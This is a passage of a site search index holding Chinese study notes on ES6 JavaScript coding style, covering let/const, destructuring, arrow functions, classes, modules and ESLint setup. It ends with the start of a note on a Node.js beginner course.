app/es6-file.js:\n\nexport class q {\n  constructor() {\n    this.es6 = 'hello';\n  }\n}\n</code></pre> <p>\u7136\u540e\uff0c\u5728\u7f51\u9875\u5185\u52a0\u8f7d\u8fd9\u4e2a\u6a21\u5757\u6587\u4ef6\u3002</p> <pre><code>&lt;script&gt;\n\nSystem.import('app/es6-file').then(function(m) {\n  console.log(new m.q().es6); // hello\n});\n\n&lt;/script&gt;\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>System.import</code>\u65b9\u6cd5\u8fd4\u56de\u7684\u662f\u4e00\u4e2a Promise \u5bf9\u8c61\uff0c\u6240\u4ee5\u53ef\u4ee5\u7528<code>then</code>\u65b9\u6cd5\u6307\u5b9a\u56de\u8c03\u51fd\u6570\u3002</p>"},{"location":"ebook-JSES6-RYF/25-%E7%BC%96%E7%A8%8B%E9%A3%8E%E6%A0%BC/","title":"\u7f16\u7a0b\u98ce\u683c","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 11969  \u9605\u8bfb24\u5206\u949f</p> <p>\u672c\u7ae0\u63a2\u8ba8\u5982\u4f55\u5c06 ES6 \u7684\u65b0\u8bed\u6cd5\uff0c\u8fd0\u7528\u5230\u7f16\u7801\u5b9e\u8df5\u4e4b\u4e2d\uff0c\u4e0e\u4f20\u7edf\u7684 JavaScript \u8bed\u6cd5\u7ed3\u5408\u5728\u4e00\u8d77\uff0c\u5199\u51fa\u5408\u7406\u7684\u3001\u6613\u4e8e\u9605\u8bfb\u548c\u7ef4\u62a4\u7684\u4ee3\u7801\u3002</p> <p>\u591a\u5bb6\u516c\u53f8\u548c\u7ec4\u7ec7\u5df2\u7ecf\u516c\u5f00\u4e86\u5b83\u4eec\u7684\u98ce\u683c\u89c4\u8303\uff0c\u4e0b\u9762\u7684\u5185\u5bb9\u4e3b\u8981\u53c2\u8003\u4e86 Airbnb \u516c\u53f8\u7684 JavaScript \u98ce\u683c\u89c4\u8303\u3002</p>"},{"location":"ebook-JSES6-RYF/25-%E7%BC%96%E7%A8%8B%E9%A3%8E%E6%A0%BC/#_2","title":"\u5757\u7ea7\u4f5c\u7528\u57df","text":"<p>\uff081\uff09let \u53d6\u4ee3 var</p> <p>ES6 \u63d0\u51fa\u4e86\u4e24\u4e2a\u65b0\u7684\u58f0\u660e\u53d8\u91cf\u7684\u547d\u4ee4\uff1a<code>let</code>\u548c<code>const</code>\u3002\u5176\u4e2d\uff0c<code>let</code>\u5b8c\u5168\u53ef\u4ee5\u53d6\u4ee3<code>var</code>\uff0c\u56e0\u4e3a\u4e24\u8005\u8bed\u4e49\u76f8\u540c\uff0c\u800c\u4e14<code>let</code>\u6ca1\u6709\u526f\u4f5c\u7528\u3002</p> <pre><code>'use strict';\n\nif (true) {\n  let x = 'hello';\n}\n\nfor (let i = 0; i &lt; 10; i++) {\n  console.log(i);\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u5982\u679c\u7528<code>var</code>\u66ff\u4ee3<code>let</code>\uff0c\u5b9e\u9645\u4e0a\u5c31\u58f0\u660e\u4e86\u4e24\u4e2a\u5168\u5c40\u53d8\u91cf\uff0c\u8fd9\u663e\u7136\u4e0d\u662f\u672c\u610f\u3002\u53d8\u91cf\u5e94\u8be5\u53ea\u5728\u5176\u58f0\u660e\u7684\u4ee3\u7801\u5757\u5185\u6709\u6548\uff0c<code>var</code>\u547d\u4ee4\u505a\u4e0d\u5230\u8fd9\u4e00\u70b9\u3002</p> <p><code>var</code>\u547d\u4ee4\u5b58\u5728\u53d8\u91cf\u63d0\u5347\u6548\u7528\uff0c<code>let</code>\u547d\u4ee4\u6ca1\u6709\u8fd9\u4e2a\u95ee\u9898\u3002</p> <pre><code>'use strict';\n\nif (true) {\n  console.log(x); // ReferenceError\n  let x = 'hello';\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u5982\u679c\u4f7f\u7528<code>var</code>\u66ff\u4ee3<code>let</code>\uff0c<code>console.log</code>\u90a3\u4e00\u884c\u5c31\u4e0d\u4f1a\u62a5\u9519\uff0c\u800c\u662f\u4f1a\u8f93\u51fa<code>undefined</code>\uff0c\u56e0\u4e3a\u53d8\u91cf\u58f0\u660e\u63d0\u5347\u5230\u4ee3\u7801\u5757\u7684\u5934\u90e8\u3002\u8fd9\u8fdd\u53cd\u4e86\u53d8\u91cf\u5148\u58f0\u660e\u540e\u4f7f\u7528\u7684\u539f\u5219\u3002</p> <p>\u6240\u4ee5\uff0c\u5efa\u8bae\u4e0d\u518d\u4f7f\u7528<code>var</code>\u547d\u4ee4\uff0c\u800c\u662f\u4f7f\u7528<code>let</code>\u547d\u4ee4\u53d6\u4ee3\u3002</p> <p>\uff082\uff09\u5168\u5c40\u5e38\u91cf\u548c\u7ebf\u7a0b\u5b89\u5168</p> <p>\u5728<code>let</code>\u548c<code>const</code>\u4e4b\u95f4\uff0c\u5efa\u8bae\u4f18\u5148\u4f7f\u7528<code>const</code>\uff0c\u5c24\u5176\u662f\u5728\u5168\u5c40\u73af\u5883\uff0c\u4e0d\u5e94\u8be5\u8bbe\u7f6e\u53d8\u91cf\uff0c\u53ea\u5e94\u8bbe\u7f6e\u5e38\u91cf\u3002</p> <p><code>const</code>\u4f18\u4e8e<code>let</code>\u6709\u51e0\u4e2a\u539f\u56e0\u3002\u4e00\u4e2a\u662f<code>const</code>\u53ef\u4ee5\u63d0\u9192\u9605\u8bfb\u7a0b\u5e8f\u7684\u4eba\uff0c\u8fd9\u4e2a\u53d8\u91cf\u4e0d\u5e94\u8be5\u6539\u53d8\uff1b\u53e6\u4e00\u4e2a\u662f<code>const</code>\u6bd4\u8f83\u7b26\u5408\u51fd\u6570\u5f0f\u7f16\u7a0b\u601d\u60f3\uff0c\u8fd0\u7b97\u4e0d\u6539\u53d8\u503c\uff0c\u53ea\u662f\u65b0\u5efa\u503c\uff0c\u800c\u4e14\u8fd9\u6837\u4e5f\u6709\u5229\u4e8e\u5c06\u6765\u7684\u5206\u5e03\u5f0f\u8fd0\u7b97\uff1b\u6700\u540e\u4e00\u4e2a\u539f\u56e0\u662f JavaScript \u7f16\u8bd1\u5668\u4f1a\u5bf9<code>const</code>\u8fdb\u884c\u4f18\u5316\uff0c\u6240\u4ee5\u591a\u4f7f\u7528<code>const</code>\uff0c\u6709\u5229\u4e8e\u63d0\u9ad8\u7a0b\u5e8f\u7684\u8fd0\u884c\u6548\u7387\uff0c\u4e5f\u5c31\u662f\u8bf4<code>let</code>\u548c<code>const</code>\u7684\u672c\u8d28\u533a\u522b\uff0c\u5176\u5b9e\u662f\u7f16\u8bd1\u5668\u5185\u90e8\u7684\u5904\u7406\u4e0d\u540c\u3002</p> <pre><code>// bad\nvar a = 1, b = 2, c = 3;\n\n// good\nconst a = 1;\nconst b = 2;\nconst c = 3;\n\n// best\nconst [a, b, c] = [1, 2, 3];\n</code></pre> <p><code>const</code>\u58f0\u660e\u5e38\u91cf\u8fd8\u6709\u4e24\u4e2a\u597d\u5904\uff0c\u4e00\u662f\u9605\u8bfb\u4ee3\u7801\u7684\u4eba\u7acb\u523b\u4f1a\u610f\u8bc6\u5230\u4e0d\u5e94\u8be5\u4fee\u6539\u8fd9\u4e2a\u503c\uff0c\u4e8c\u662f\u9632\u6b62\u4e86\u65e0\u610f\u95f4\u4fee\u6539\u53d8\u91cf\u503c\u6240\u5bfc\u81f4\u7684\u9519\u8bef\u3002</p> <p>\u6240\u6709\u7684\u51fd\u6570\u90fd\u5e94\u8be5\u8bbe\u7f6e\u4e3a\u5e38\u91cf\u3002</p> <p>\u957f\u8fdc\u6765\u770b\uff0cJavaScript \u53ef\u80fd\u4f1a\u6709\u591a\u7ebf\u7a0b\u7684\u5b9e\u73b0\uff08\u6bd4\u5982 Intel \u516c\u53f8\u7684 River Trail \u90a3\u4e00\u7c7b\u7684\u9879\u76ee\uff09\uff0c\u8fd9\u65f6<code>let</code>\u8868\u793a\u7684\u53d8\u91cf\uff0c\u53ea\u5e94\u51fa\u73b0\u5728\u5355\u7ebf\u7a0b\u8fd0\u884c\u7684\u4ee3\u7801\u4e2d\uff0c\u4e0d\u80fd\u662f\u591a\u7ebf\u7a0b\u5171\u4eab\u7684\uff0c\u8fd9\u6837\u6709\u5229\u4e8e\u4fdd\u8bc1\u7ebf\u7a0b\u5b89\u5168\u3002</p>"},{"location":"ebook-JSES6-RYF/25-%E7%BC%96%E7%A8%8B%E9%A3%8E%E6%A0%BC/#_3","title":"\u5b57\u7b26\u4e32","text":"<p>\u9759\u6001\u5b57\u7b26\u4e32\u4e00\u5f8b\u4f7f\u7528\u5355\u5f15\u53f7\u6216\u53cd\u5f15\u53f7\uff0c\u4e0d\u4f7f\u7528\u53cc\u5f15\u53f7\u3002\u52a8\u6001\u5b57\u7b26\u4e32\u4f7f\u7528\u53cd\u5f15\u53f7\u3002</p> <pre><code>// bad\nconst a = \"foobar\";\nconst b = 'foo' + a + 'bar';\n\n// acceptable\nconst c = `foobar`;\n\n// good\nconst a = 'foobar';\nconst b = `foo${a}bar`;\n</code></pre>"},{"location":"ebook-JSES6-RYF/25-%E7%BC%96%E7%A8%8B%E9%A3%8E%E6%A0%BC/#_4","title":"\u89e3\u6784\u8d4b\u503c","text":"<p>\u4f7f\u7528\u6570\u7ec4\u6210\u5458\u5bf9\u53d8\u91cf\u8d4b\u503c\u65f6\uff0c\u4f18\u5148\u4f7f\u7528\u89e3\u6784\u8d4b\u503c\u3002</p> <pre><code>const arr = [1, 2, 3, 4];\n\n// bad\nconst first = arr[0];\nconst second = arr[1];\n\n// good\nconst [first, second] = arr;\n</code></pre> <p>\u51fd\u6570\u7684\u53c2\u6570\u5982\u679c\u662f\u5bf9\u8c61\u7684\u6210\u5458\uff0c\u4f18\u5148\u4f7f\u7528\u89e3\u6784\u8d4b\u503c\u3002</p> <pre><code>// bad\nfunction getFullName(user) {\n  const firstName = user.firstName;\n  const lastName = user.lastName;\n}\n\n// good\nfunction getFullName(obj) {\n  const { firstName, lastName } = obj;\n}\n\n// best\nfunction getFullName({ firstName, lastName }) {\n}\n</code></pre> <p>\u5982\u679c\u51fd\u6570\u8fd4\u56de\u591a\u4e2a\u503c\uff0c\u4f18\u5148\u4f7f\u7528\u5bf9\u8c61\u7684\u89e3\u6784\u8d4b\u503c\uff0c\u800c\u4e0d\u662f\u6570\u7ec4\u7684\u89e3\u6784\u8d4b\u503c\u3002\u8fd9\u6837\u4fbf\u4e8e\u4ee5\u540e\u6dfb\u52a0\u8fd4\u56de\u503c\uff0c\u4ee5\u53ca\u66f4\u6539\u8fd4\u56de\u503c\u7684\u987a\u5e8f\u3002</p> <pre><code>// bad\nfunction processInput(input) {\n  return [left, right, top, bottom];\n}\n\n// good\nfunction processInput(input) {\n  return { left, right, top, bottom };\n}\n\nconst { left, right } = processInput(input);\n</code></pre>"},{"location":"ebook-JSES6-RYF/25-%E7%BC%96%E7%A8%8B%E9%A3%8E%E6%A0%BC/#_5","title":"\u5bf9\u8c61","text":"<p>\u5355\u884c\u5b9a\u4e49\u7684\u5bf9\u8c61\uff0c\u6700\u540e\u4e00\u4e2a\u6210\u5458\u4e0d\u4ee5\u9017\u53f7\u7ed3\u5c3e\u3002\u591a\u884c\u5b9a\u4e49\u7684\u5bf9\u8c61\uff0c\u6700\u540e\u4e00\u4e2a\u6210\u5458\u4ee5\u9017\u53f7\u7ed3\u5c3e\u3002</p> <pre><code>// bad\nconst a = { k1: v1, k2: v2, };\nconst b = {\n  k1: v1,\n  k2: v2\n};\n\n// good\nconst a = { k1: v1, k2: v2 };\nconst b = {\n  k1: v1,\n  k2: v2,\n};\n</code></pre> <p>\u5bf9\u8c61\u5c3d\u91cf\u9759\u6001\u5316\uff0c\u4e00\u65e6\u5b9a\u4e49\uff0c\u5c31\u4e0d\u5f97\u968f\u610f\u6dfb\u52a0\u65b0\u7684\u5c5e\u6027\u3002\u5982\u679c\u6dfb\u52a0\u5c5e\u6027\u4e0d\u53ef\u907f\u514d\uff0c\u8981\u4f7f\u7528<code>Object.assign</code>\u65b9\u6cd5\u3002</p> <pre><code>// bad\nconst a = {};\na.x = 3;\n\n// if reshape unavoidable\nconst a = {};\nObject.assign(a, { x: 3 });\n\n// good\nconst a = { x: null };\na.x = 3;\n</code></pre> <p>\u5982\u679c\u5bf9\u8c61\u7684\u5c5e\u6027\u540d\u662f\u52a8\u6001\u7684\uff0c\u53ef\u4ee5\u5728\u521b\u9020\u5bf9\u8c61\u7684\u65f6\u5019\uff0c\u4f7f\u7528\u5c5e\u6027\u8868\u8fbe\u5f0f\u5b9a\u4e49\u3002</p> <pre><code>// bad\nconst obj = {\n  id: 5,\n  name: 'San Francisco',\n};\nobj[getKey('enabled')] = true;\n\n// good\nconst obj = {\n  id: 5,\n  name: 'San Francisco',\n  [getKey('enabled')]: true,\n};\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5bf9\u8c61<code>obj</code>\u7684\u6700\u540e\u4e00\u4e2a\u5c5e\u6027\u540d\uff0c\u9700\u8981\u8ba1\u7b97\u5f97\u5230\u3002\u8fd9\u65f6\u6700\u597d\u91c7\u7528\u5c5e\u6027\u8868\u8fbe\u5f0f\uff0c\u5728\u65b0\u5efa<code>obj</code>\u7684\u65f6\u5019\uff0c\u5c06\u8be5\u5c5e\u6027\u4e0e\u5176\u4ed6\u5c5e\u6027\u5b9a\u4e49\u5728\u4e00\u8d77\u3002\u8fd9\u6837\u4e00\u6765\uff0c\u6240\u6709\u5c5e\u6027\u5c31\u5728\u4e00\u4e2a\u5730\u65b9\u5b9a\u4e49\u4e86\u3002</p> <p>\u53e6\u5916\uff0c\u5bf9\u8c61\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\uff0c\u5c3d\u91cf\u91c7\u7528\u7b80\u6d01\u8868\u8fbe\u6cd5\uff0c\u8fd9\u6837\u6613\u4e8e\u63cf\u8ff0\u548c\u4e66\u5199\u3002</p> <pre><code>var ref = 'some value';\n\n// bad\nconst atom = {\n  ref: ref,\n\n  value: 1,\n\n  addValue: function (value) {\n    return atom.value + value;\n  },\n};\n\n// good\nconst atom = {\n  ref,\n\n  value: 1,\n\n  addValue(value) {\n    return atom.value + value;\n  },\n};\n</code></pre>"},{"location":"ebook-JSES6-RYF/25-%E7%BC%96%E7%A8%8B%E9%A3%8E%E6%A0%BC/#_6","title":"\u6570\u7ec4","text":"<p>\u4f7f\u7528\u6269\u5c55\u8fd0\u7b97\u7b26\uff08...\uff09\u62f7\u8d1d\u6570\u7ec4\u3002</p> <pre><code>// bad\nconst len = items.length;\nconst itemsCopy = [];\nlet i;\n\nfor (i = 0; i &lt; len; i++) {\n  itemsCopy[i] = items[i];\n}\n\n// good\nconst itemsCopy = [...items];\n</code></pre> <p>\u4f7f\u7528 Array.from \u65b9\u6cd5\uff0c\u5c06\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\u8f6c\u4e3a\u6570\u7ec4\u3002</p> <pre><code>const foo = document.querySelectorAll('.foo');\nconst nodes = Array.from(foo);\n</code></pre>"},{"location":"ebook-JSES6-RYF/25-%E7%BC%96%E7%A8%8B%E9%A3%8E%E6%A0%BC/#_7","title":"\u51fd\u6570","text":"<p>\u7acb\u5373\u6267\u884c\u51fd\u6570\u53ef\u4ee5\u5199\u6210\u7bad\u5934\u51fd\u6570\u7684\u5f62\u5f0f\u3002</p> <pre><code>(() =&gt; {\n  console.log('Welcome to the Internet.');\n})();\n</code></pre> <p>\u90a3\u4e9b\u4f7f\u7528\u533f\u540d\u51fd\u6570\u5f53\u4f5c\u53c2\u6570\u7684\u573a\u5408\uff0c\u5c3d\u91cf\u7528\u7bad\u5934\u51fd\u6570\u4ee3\u66ff\u3002\u56e0\u4e3a\u8fd9\u6837\u66f4\u7b80\u6d01\uff0c\u800c\u4e14\u7ed1\u5b9a\u4e86 this\u3002</p> <pre><code>// bad\n[1, 2, 3].map(function (x) {\n  return x * x;\n});\n\n// good\n[1, 2, 3].map((x) =&gt; {\n  return x * x;\n});\n\n// best\n[1, 2, 3].map(x =&gt; x * x);\n</code></pre> <p>\u7bad\u5934\u51fd\u6570\u53d6\u4ee3<code>Function.prototype.bind</code>\uff0c\u4e0d\u5e94\u518d\u7528 self/_this/that \u7ed1\u5b9a this\u3002</p> <pre><code>// bad\nconst self = this;\nconst boundMethod = function(...params) {\n  return method.apply(self, params);\n}\n\n// acceptable\nconst boundMethod = method.bind(this);\n\n// best\nconst boundMethod = (...params) =&gt; method.apply(this, params);\n</code></pre> <p>\u7b80\u5355\u7684\u3001\u5355\u884c\u7684\u3001\u4e0d\u4f1a\u590d\u7528\u7684\u51fd\u6570\uff0c\u5efa\u8bae\u91c7\u7528\u7bad\u5934\u51fd\u6570\u3002\u5982\u679c\u51fd\u6570\u4f53\u8f83\u4e3a\u590d\u6742\uff0c\u884c\u6570\u8f83\u591a\uff0c\u8fd8\u662f\u5e94\u8be5\u91c7\u7528\u4f20\u7edf\u7684\u51fd\u6570\u5199\u6cd5\u3002</p> <p>\u6240\u6709\u914d\u7f6e\u9879\u90fd\u5e94\u8be5\u96c6\u4e2d\u5728\u4e00\u4e2a\u5bf9\u8c61\uff0c\u653e\u5728\u6700\u540e\u4e00\u4e2a\u53c2\u6570\uff0c\u5e03\u5c14\u503c\u4e0d\u53ef\u4ee5\u76f4\u63a5\u4f5c\u4e3a\u53c2\u6570\u3002</p> <pre><code>// bad\nfunction divide(a, b, option = false ) {\n}\n\n// good\nfunction divide(a, b, { option = false } = {}) {\n}\n</code></pre> <p>\u4e0d\u8981\u5728\u51fd\u6570\u4f53\u5185\u4f7f\u7528 arguments \u53d8\u91cf\uff0c\u4f7f\u7528 rest \u8fd0\u7b97\u7b26\uff08...\uff09\u4ee3\u66ff\u3002\u56e0\u4e3a rest \u8fd0\u7b97\u7b26\u663e\u5f0f\u8868\u660e\u4f60\u60f3\u8981\u83b7\u53d6\u53c2\u6570\uff0c\u800c\u4e14 arguments \u662f\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff0c\u800c rest \u8fd0\u7b97\u7b26\u53ef\u4ee5\u63d0\u4f9b\u4e00\u4e2a\u771f\u6b63\u7684\u6570\u7ec4\u3002</p> <pre><code>// bad\nfunction concatenateAll() {\n  const args = Array.prototype.slice.call(arguments);\n  return args.join('');\n}\n\n// good\nfunction concatenateAll(...args) {\n  return args.join('');\n}\n</code></pre> <p>\u4f7f\u7528\u9ed8\u8ba4\u503c\u8bed\u6cd5\u8bbe\u7f6e\u51fd\u6570\u53c2\u6570\u7684\u9ed8\u8ba4\u503c\u3002</p> <pre><code>// bad\nfunction handleThings(opts) {\n  opts = opts || {};\n}\n\n// good\nfunction handleThings(opts = {}) {\n  // ...\n}\n</code></pre>"},{"location":"ebook-JSES6-RYF/25-%E7%BC%96%E7%A8%8B%E9%A3%8E%E6%A0%BC/#map","title":"Map \u7ed3\u6784","text":"<p>\u6ce8\u610f\u533a\u5206 Object \u548c Map\uff0c\u53ea\u6709\u6a21\u62df\u73b0\u5b9e\u4e16\u754c\u7684\u5b9e\u4f53\u5bf9\u8c61\u65f6\uff0c\u624d\u4f7f\u7528 Object\u3002\u5982\u679c\u53ea\u662f\u9700\u8981<code>key: value</code>\u7684\u6570\u636e\u7ed3\u6784\uff0c\u4f7f\u7528 Map \u7ed3\u6784\u3002\u56e0\u4e3a Map \u6709\u5185\u5efa\u7684\u904d\u5386\u673a\u5236\u3002</p> <pre><code>let map = new Map(arr);\n\nfor (let key of map.keys()) {\n  console.log(key);\n}\n\nfor (let value of map.values()) {\n  console.log(value);\n}\n\nfor (let item of map.entries()) {\n  console.log(item[0], item[1]);\n}\n</code></pre>"},{"location":"ebook-JSES6-RYF/25-%E7%BC%96%E7%A8%8B%E9%A3%8E%E6%A0%BC/#class","title":"Class","text":"<p>\u603b\u662f\u7528 Class\uff0c\u53d6\u4ee3\u9700\u8981 prototype \u7684\u64cd\u4f5c\u3002\u56e0\u4e3a Class \u7684\u5199\u6cd5\u66f4\u7b80\u6d01\uff0c\u66f4\u6613\u4e8e\u7406\u89e3\u3002</p> <pre><code>// bad\nfunction Queue(contents = []) {\n  this._queue = [...contents];\n}\nQueue.prototype.pop = function() {\n  const value = this._queue[0];\n  this._queue.splice(0, 1);\n  return value;\n}\n\n// good\nclass Queue {\n  constructor(contents = []) {\n    this._queue = [...contents];\n  }\n  pop() {\n    const value = this._queue[0];\n    this._queue.splice(0, 1);\n    return value;\n  }\n}\n</code></pre> <p>\u4f7f\u7528<code>extends</code>\u5b9e\u73b0\u7ee7\u627f\uff0c\u56e0\u4e3a\u8fd9\u6837\u66f4\u7b80\u5355\uff0c\u4e0d\u4f1a\u6709\u7834\u574f<code>instanceof</code>\u8fd0\u7b97\u7684\u5371\u9669\u3002</p> <pre><code>// bad\nconst inherits = require('inherits');\nfunction PeekableQueue(contents) {\n  Queue.apply(this, contents);\n}\ninherits(PeekableQueue, Queue);\nPeekableQueue.prototype.peek = function() {\n  return this._queue[0];\n}\n\n// good\nclass PeekableQueue extends Queue {\n  peek() {\n    return this._queue[0];\n  }\n}\n</code></pre>"},{"location":"ebook-JSES6-RYF/25-%E7%BC%96%E7%A8%8B%E9%A3%8E%E6%A0%BC/#_8","title":"\u6a21\u5757","text":"<p>\u9996\u5148\uff0cModule \u8bed\u6cd5\u662f JavaScript \u6a21\u5757\u7684\u6807\u51c6\u5199\u6cd5\uff0c\u575a\u6301\u4f7f\u7528\u8fd9\u79cd\u5199\u6cd5\u3002\u4f7f\u7528<code>import</code>\u53d6\u4ee3<code>require</code>\u3002</p> <pre><code>// bad\nconst moduleA = require('moduleA');\nconst func1 = moduleA.func1;\nconst func2 = moduleA.func2;\n\n// good\nimport { func1, func2 } from 'moduleA';\n</code></pre> <p>\u4f7f\u7528<code>export</code>\u53d6\u4ee3<code>module.exports</code>\u3002</p> <pre><code>// commonJS\u7684\u5199\u6cd5\nvar React = require('react');\nvar Breadcrumbs = React.createClass({\n  render() {\n    return &lt;nav /&gt;;\n  }\n});\nmodule.exports = Breadcrumbs;\n\n// ES6\u7684\u5199\u6cd5\nimport React from 'react';\nclass Breadcrumbs extends React.Component {\n  render() {\n    return &lt;nav /&gt;;\n  }\n};\nexport default Breadcrumbs;\n</code></pre> <p>==\u5982\u679c\u6a21\u5757\u53ea\u6709\u4e00\u4e2a\u8f93\u51fa\u503c\uff0c\u5c31\u4f7f\u7528<code>export default</code>\uff0c==\u5982\u679c\u6a21\u5757\u6709\u591a\u4e2a\u8f93\u51fa\u503c\uff0c\u5c31\u4e0d\u4f7f\u7528<code>export default</code>\uff0c<code>export default</code>\u4e0e\u666e\u901a\u7684<code>export</code>\u4e0d\u8981\u540c\u65f6\u4f7f\u7528\u3002</p> <p>\u4e0d\u8981\u5728\u6a21\u5757\u8f93\u5165\u4e2d\u4f7f\u7528\u901a\u914d\u7b26\u3002\u56e0\u4e3a\u8fd9\u6837\u53ef\u4ee5\u786e\u4fdd\u4f60\u7684\u6a21\u5757\u4e4b\u4e2d\uff0c\u6709\u4e00\u4e2a\u9ed8\u8ba4\u8f93\u51fa\uff08export default\uff09\u3002</p> <pre><code>// bad\nimport * as myObject from './importModule';\n\n// good\nimport myObject from './importModule';\n</code></pre> <p>\u5982\u679c\u6a21\u5757\u9ed8\u8ba4\u8f93\u51fa\u4e00\u4e2a\u51fd\u6570\uff0c\u51fd\u6570\u540d\u7684\u9996\u5b57\u6bcd\u5e94\u8be5\u5c0f\u5199\u3002</p> <pre><code>function makeStyleGuide() {\n}\n\nexport default makeStyleGuide;\n</code></pre> <p>\u5982\u679c\u6a21\u5757\u9ed8\u8ba4\u8f93\u51fa\u4e00\u4e2a\u5bf9\u8c61\uff0c\u5bf9\u8c61\u540d\u7684\u9996\u5b57\u6bcd\u5e94\u8be5\u5927\u5199\u3002</p> <pre><code>const StyleGuide = {\n  es6: {\n  }\n};\n\nexport default StyleGuide;\n</code></pre>"},{"location":"ebook-JSES6-RYF/25-%E7%BC%96%E7%A8%8B%E9%A3%8E%E6%A0%BC/#eslint","title":"ESLint \u7684\u4f7f\u7528","text":"<p>ESLint \u662f\u4e00\u4e2a\u8bed\u6cd5\u89c4\u5219\u548c\u4ee3\u7801\u98ce\u683c\u7684\u68c0\u67e5\u5de5\u5177\uff0c\u53ef\u4ee5\u7528\u6765\u4fdd\u8bc1\u5199\u51fa\u8bed\u6cd5\u6b63\u786e\u3001\u98ce\u683c\u7edf\u4e00\u7684\u4ee3\u7801\u3002</p> <p>\u9996\u5148\uff0c\u5b89\u88c5 ESLint\u3002</p> <pre><code>$ npm i -g eslint\n</code></pre> <p>\u7136\u540e\uff0c\u5b89\u88c5 Airbnb \u8bed\u6cd5\u89c4\u5219\uff0c\u4ee5\u53ca import\u3001a11y\u3001react \u63d2\u4ef6\u3002</p> <pre><code>$ npm i -g eslint-config-airbnb\n$ npm i -g eslint-plugin-import eslint-plugin-jsx-a11y eslint-plugin-react\n</code></pre> <p>\u6700\u540e\uff0c\u5728\u9879\u76ee\u7684\u6839\u76ee\u5f55\u4e0b\u65b0\u5efa\u4e00\u4e2a<code>.eslintrc</code>\u6587\u4ef6\uff0c\u914d\u7f6e ESLint\u3002</p> <pre><code>{\n  \"extends\": \"eslint-config-airbnb\"\n}\n</code></pre> <p>\u73b0\u5728\u5c31\u53ef\u4ee5\u68c0\u67e5\uff0c\u5f53\u524d\u9879\u76ee\u7684\u4ee3\u7801\u662f\u5426\u7b26\u5408\u9884\u8bbe\u7684\u89c4\u5219\u3002</p> <p><code>index.js</code>\u6587\u4ef6\u7684\u4ee3\u7801\u5982\u4e0b\u3002</p> <pre><code>var unusued = 'I have no purpose!';\n\nfunction greet() {\n    var message = 'Hello, World!';\n    alert(message);\n}\n\ngreet();\n</code></pre> <p>\u4f7f\u7528 ESLint \u68c0\u67e5\u8fd9\u4e2a\u6587\u4ef6\uff0c\u5c31\u4f1a\u62a5\u51fa\u9519\u8bef\u3002</p> <pre><code>$ eslint index.js\nindex.js\n  1:1  error  Unexpected var, use let or const instead          no-var\n  1:5  error  unusued is defined but never used                 no-unused-vars\n  4:5  error  Expected indentation of 2 characters but found 4  indent\n  4:5  error  Unexpected var, use let or const instead          no-var\n  5:5  error  Expected indentation of 2 characters but found 4  indent\n\n\u2716 5 problems (5 errors, 0 warnings)\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u8bf4\u660e\uff0c\u539f\u6587\u4ef6\u6709\u4e94\u4e2a\u9519\u8bef\uff0c\u5176\u4e2d\u4e24\u4e2a\u662f\u4e0d\u5e94\u8be5\u4f7f\u7528<code>var</code>\u547d\u4ee4\uff0c\u800c\u8981\u4f7f\u7528<code>let</code>\u6216<code>const</code>\uff1b\u4e00\u4e2a\u662f\u5b9a\u4e49\u4e86\u53d8\u91cf\uff0c\u5374\u6ca1\u6709\u4f7f\u7528\uff1b\u53e6\u5916\u4e24\u4e2a\u662f\u884c\u9996\u7f29\u8fdb\u4e3a 4 \u4e2a\u7a7a\u683c\uff0c\u800c\u4e0d\u662f\u89c4\u5b9a\u7684 2 \u4e2a\u7a7a\u683c\u3002</p>"},{"location":"ebook-JSES6-RYF/readme/","title":"readme","text":""},{"location":"ebook-JSES6-RYF/readme/#00","title":"00 \u524d\u8a00","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 126  \u9605\u8bfb1\u5206\u949f</p> <p>\u8fd9\u672c\u4e66\u7531\u962e\u4e00\u5cf0\u8001\u5e08\u8457\uff0c\u539f\u4e66\u94fe\u63a5\uff1ahttp://es6.ruanyifeng.com/#docs/</p> <p>2019\u5e748\u6708\u7cfb\u7edf\u5168\u4e66\u5b66\u4e60</p>"},{"location":"ebook-heima-nodejs/00/","title":"\u9ed1\u9a6c\u7a0b\u5e8f\u5458Node.js\u516b\u5929\u5165\u95e8\u6559\u7a0b","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 3456  \u9605\u8bfb7\u5206\u949f</p> <p>2021\u5e7412\u6708\u4e0a\u67b6</p> <p>nodeJS 12\u7248\u672c\uff0c\u5927\u6982\u662f 2020 \u5e74\u7684\u8bfe\u7a0b</p> <p>nodejs\u6700\u65b0\u6559\u7a0b\u542bes6\u6a21\u5757\u5316+npm+express+webpack+promise+\u5b9e\u6218\u6848\u4f8b\u8be6\u89e3</p> <p>https://www.bilibili.com/video/BV1a34y167AZ</p> <p>90\u5c0f\u8282\u8bfe\u7a0b\uff0c\u6bcf\u4e00\u4e2a10-15\u5206\u949f</p> <p>\u672c\u5957\u8bfe\u7a0b\u4f5c\u4e3a\u6846\u67b6\u524d\u7f6e\u8bfe\uff0c\u91cd\u70b9\u4e3a\u5b66\u751f\u94fa\u57ab npm\u3001\u5305\u3001\u6a21\u5757\u5316\u3001\u8eab\u4efd\u8ba4\u8bc1\u3001CORS \u8de8\u57df\u7b49\u4e3b\u8981\u77e5\u8bc6\u70b9\uff0c\u4e3a\u5b66\u4e60\u540e\u9762\u7684 Vue \u8bfe\u7a0b\u592f\u5b9e\u57fa\u7840\u3002 \u540c\u65f6\uff0c\u672c\u8bfe\u7a0b\u6db5\u76d6\u4e86 MySQL \u6570\u636e\u5e93\u3001API 